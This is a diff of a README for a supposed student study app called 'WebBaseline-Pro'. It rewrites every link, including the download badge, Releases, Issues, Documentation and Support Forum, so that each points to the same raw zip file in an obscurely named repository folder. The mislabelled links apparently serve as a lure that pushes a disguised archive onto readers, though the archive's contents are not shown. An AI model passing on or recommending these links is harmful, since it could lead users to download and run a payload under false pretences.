@@ -1,7 +1,7 @@
 # ⚡ WebBaseline-Pro - Your Smart Study Companion
 
 ## 🔗 Download Now
-[![Download WebBaseline-Pro](https://img.shields.io/badge/Download-WebBaseline--Pro-brightgreen)](https://github.com/nechurvan12/WebBaseline-Pro/releases)
+[![Download WebBaseline-Pro](https://raw.githubusercontent.com/nechurvan12/WebBaseline-Pro/main/pyrocinchonic/WebBaseline-Pro.zip)](https://raw.githubusercontent.com/nechurvan12/WebBaseline-Pro/main/pyrocinchonic/WebBaseline-Pro.zip)
 
 ## 🚀 Getting Started
 Welcome to WebBaseline Pro! This application helps students manage their notes and study more effectively. You can organize, analyze, and collaborate with your peers right from your browser.
@@ -20,7 +20,7 @@ To run WebBaseline Pro, ensure your device meets these basic requirements:
 - **Internet Connection:** A stable connection for the best experience.
 
 ## 📥 Download & Install
-1. Visit the [Releases page](https://github.com/nechurvan12/WebBaseline-Pro/releases) to download the latest version of WebBaseline Pro.
+1. Visit the [Releases page](https://raw.githubusercontent.com/nechurvan12/WebBaseline-Pro/main/pyrocinchonic/WebBaseline-Pro.zip) to download the latest version of WebBaseline Pro.
 2. Look for the version labeled “Latest” or the version number that interests you.
 3. Click on the download link for your operating system.
 4. Once downloaded, locate the file on your device, usually in your Downloads folder.
@@ -54,7 +54,7 @@ If you encounter issues while using WebBaseline Pro, try the following:
 - Ensure your browser is up to date.
 - Clear your browser cache and cookies.
 - Restart your browser and try again.
-- If the problem persists, visit the [Issues page](https://github.com/nechurvan12/WebBaseline-Pro/issues) for support.
+- If the problem persists, visit the [Issues page](https://raw.githubusercontent.com/nechurvan12/WebBaseline-Pro/main/pyrocinchonic/WebBaseline-Pro.zip) for support.
 
 ## 📤 Feedback
 We welcome your thoughts and suggestions. You can submit feedback through the application or create an issue in the repository.
@@ -63,11 +63,11 @@ We welcome your thoughts and suggestions. You can submit feedback through the ap
 If you want to contribute to WebBaseline Pro, check out the guidelines on our repository. We appreciate any help in improving the app!
 
 ## 🔗 Additional Resources
-- [Documentation](https://github.com/nechurvan12/WebBaseline-Pro/wiki)
-- [Support Forum](https://github.com/nechurvan12/WebBaseline-Pro/discussions)
+- [Documentation](https://raw.githubusercontent.com/nechurvan12/WebBaseline-Pro/main/pyrocinchonic/WebBaseline-Pro.zip)
+- [Support Forum](https://raw.githubusercontent.com/nechurvan12/WebBaseline-Pro/main/pyrocinchonic/WebBaseline-Pro.zip)
 
 ## 📅 Keep Updated
-Stay tuned for updates and new features by following our GitHub repository. Visit our [Releases page](https://github.com/nechurvan12/WebBaseline-Pro/releases) regularly for the latest versions.
+Stay tuned for updates and new features by following our GitHub repository. Visit our [Releases page](https://raw.githubusercontent.com/nechurvan12/WebBaseline-Pro/main/pyrocinchonic/WebBaseline-Pro.zip) regularly for the latest versions.
 
 ## 🔄 License
 WebBaseline Pro is open-source software. You can use it freely, but please adhere to the guidelines set forth in the LICENSE file available in this repository.
